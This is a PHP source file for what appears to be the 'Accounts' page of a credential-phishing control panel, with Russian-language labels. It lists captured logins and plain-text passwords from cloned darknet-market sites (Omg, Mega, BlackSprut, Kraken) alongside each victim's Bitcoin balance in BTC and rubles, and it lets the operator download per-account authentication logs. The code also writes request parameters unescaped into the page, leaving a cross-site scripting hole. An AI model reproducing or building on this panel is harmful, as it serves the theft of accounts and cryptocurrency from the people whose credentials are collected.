<?php 
	$limit = isset($_GET['limit']) ? intval($_GET['limit']) : 10;
	$page_num = isset($_GET['page-num']) ? intval($_GET['page-num']) : 1;

	$get_curse = json_decode(file_get_contents('https://www.blockchain.com/ru/ticker'), true);

	$sql = 'FROM `accounts`';

	if (isset($_GET['date'])) {
		$date_start = $db->real_escape_string( date('Y-m-d h:m:s', strtotime($_GET['date'])) );
		$date_end = $db->real_escape_string( date('Y-m-d h:m:s', strtotime($_GET['date-od'])) );

		if (empty($_GET['date']) && !empty($_GET['date-od'])) {
			$where = "WHERE date <= '{$date_end}'";
		} elseif(!empty($_GET['date']) && empty($_GET['date-od'])) {
			$where = "WHERE date >= '{$date_start}'";
		} else if (!empty($_GET['date']) && !empty($_GET['date-od'])) {
			$where = "WHERE date >= '{$date_start}' and date <= '{$date_end}'";
		}



		



		$od_date_input = '<input type="date" name="date" value="'. $_GET['date'] .'"><input type="date" name="date-od" value="'. $_GET['date-od'] .'">';


	} else {
		$od_date_input = '<input type="date" name="date"><input type="date" name="date-od">';
	}



	$date_i = ''; 
	$auth_i = ''; 
	$goodauth_i = ''; 
	$balance_i = ''; 
	$date_input = '';
	$auth_input = '';
	$goodauth_input = '';
	$balance_input = '';

	if (isset($_GET['date-table']) && !empty($_GET['date-table'])) {
		if ($_GET['date-table'] == 'DESC') {
			$order['date-table'] = '`date` DESC';
			$date_i = '<i class="fas fa-chevron-down"></i>';
			$date_input = '<input type="hidden" name="date-table" value="DESC">';
		} else {
			$order['date-table'] = '`date` ASC';
			$date_i = '<i class="fas fa-chevron-up"></i>';
			$date_input = '<input type="hidden" name="date-table" value="ASC">';
		}
	}




	if (isset($_GET['balance']) && !empty($_GET['balance'])) {
		if ($_GET['balance'] == 'DESC') {
			$order['balance'] = '`balance` DESC';
			$balance_i = '<i class="fas fa-chevron-down"></i>';
			$balance_input = '<input type="hidden" name="balance" value="DESC">';
		} else {
			$order['balance'] = '`balance` ASC';
			$balance_i = '<i class="fas fa-chevron-up"></i>';
			$balance_input = '<input type="hidden" name="balance" value="ASC">';
		}
	}


	$accounts_type = [
		0 => 'Все аккаунты',
		3 => 'Смена паролей',
		2 => 'Ошибки',
	];

	foreach ($accounts_type as $key => $value) {
		if ($_GET['account-type'] == $key) {
			$option_account .= "<option value=\"{$key}\" selected>{$value}</option>";
		} else {
			$option_account .= "<option value=\"{$key}\">{$value}</option>";
		}
	}

	$option_account = "<select class='beatu-select' name=\"account-type\">{$option_account}</select>";




	$sites_type = [
		0 => 'Сайт',
		'omg' => 'Omg',
		'mega' => 'Mega',
		'blacksprut' => 'BlackSprut',
		'kraken' => 'Kraken',
	];

	foreach ($sites_type as $key => $value) {
		if ($_GET['site-name'] == $key) {
			$option_sites .= "<option value=\"{$key}\" selected>{$value}</option>";
		} else {
			$option_sites .= "<option value=\"{$key}\">{$value}</option>";
		}
	}

	$option_sites = "<select class='beatu-select' name=\"site-name\">{$option_sites}</select>";








	if (isset($_GET['account-type']) && $_GET['account-type'] != 0) {
		$account_type = intval($_GET['account-type']);
		if (isset($where) && isset($_GET['account-type'])) {
			$where .= " AND `valid` = {$account_type} ";
		} else {
			$where .= " WHERE `valid` = {$account_type} ";
		}
	}


	if (isset($_GET['site-name']) && $_GET['site-name'] !== 0) {
		$siename = $db->real_escape_string($_GET['site-name']);
		if (isset($where)) {
			$where .= " AND `site_name` = '{$siename}' ";
		} else {
			$where .= " WHERE `site_name` = '{$siename}' ";
		}
	}



	if (isset($where)) {
		$where .= " AND `user_id` = {$user_id} ";
	} else {
		$where .= " WHERE `user_id` = {$user_id} ";
	}



	$sql .= ' '. $where;


	if (isset($order) && count($order)) {
		$sql .= ' ORDER BY ' .implode(', ', $order);
	}



	if (isset($_GET['page-num'])) {
		$pageformat = preg_replace('/page-num=(\d+)/', 'page-num={pagenum}', $_SERVER['REQUEST_URI']);
	} elseif(count($_GET)) {
		$pageformat = $_SERVER['REQUEST_URI']. '&page-num={pagenum}';
	}
	
	$result = Pagination ($db, $sql, $limit, $pageformat, $page_num);



	if (!count($result['result'])) {
		$tr = '<tr class="errorblock">
						<td><p>Ошибка ничего не найдено</p></td>
					</tr>';
	} else {
		foreach ($result['result'] as $key => $value) {
			$authlog = '';
			if ($value['data']) {
				$dat_info = json_decode($value['data'], true);
				foreach ($dat_info as $k => $val) {
					$authlog .= "{$k}: {$val}\r\n";
				}
			}

			$rubl_balance = round(($value['balance'] * $get_curse['RUB']['last']));
			$tr .= "<tr class='valid_{$value['valid']}'>
						<td aria-label='Дата:'>{$value['date']}</td>
						<td aria-label='Данные:'>{$value['login']}:{$value['password']}</td>
						<td aria-label='Баланс:'>{$value['balance']} BTC | {$rubl_balance} RUB</td>
						<td aria-label='Auth:'><a href='javascript:;' data-type='fdsas' class='viewlog' download='{$value['id']}.txt'>Скачать <textarea hidden>{$authlog}</textarea> </a></td>
					</tr>";
		}
	}



?>


<h2>Аккаунты</h2>



	<form action="/?page=accounts" method="get" id="statisticform">
						
		<div class="filterblock">
				<div class="date">
					<p>Фильтры:</p>
				    <div class="dateblock">
					    <?= $od_date_input; ?>

					    <?= $option_account; ?>

					    <?= $option_sites; ?>
				    </div>
				</div>
				    <div class="refresh">
				    	<a href="javascript:;">Обновить</a>
				    	<a href="javascript:;">Очистить</a>
				    </div>
			</div>


			<div class="selectblock">
				<p>Количество:</p>
				<select name="limit" id="limit">
<?php 

$options = [10,25,50,100];
foreach ($options as  $value) {
	if ($value == $_GET['limit']) {
		echo "<option value=\"{$value}\" selected>{$value}</option>";
	} else {
		echo "<option value=\"{$value}\">{$value}</option>";
	}
}

?>
				</select>
			</div>
			<?= $balance_input; ?>
			<?= $date_input; ?>
			

<div class="tableblock">
				<table>
				<thead>
					<tr>
						<td data-type="date-table">Дата <span><?= $date_i; ?></span></td>
						<td>Данные</td>
						<td data-type="balance">Баланс<span><?= $balance_i; ?></span></td>
						<td>Auth</td>
					</tr>
				</thead>
				<tbody>
					<?= $tr; ?>
				</tbody>
			</table>
</div>
</form>
		<div class="pagination">
			<?= $result['pagination']; ?>
		</div>
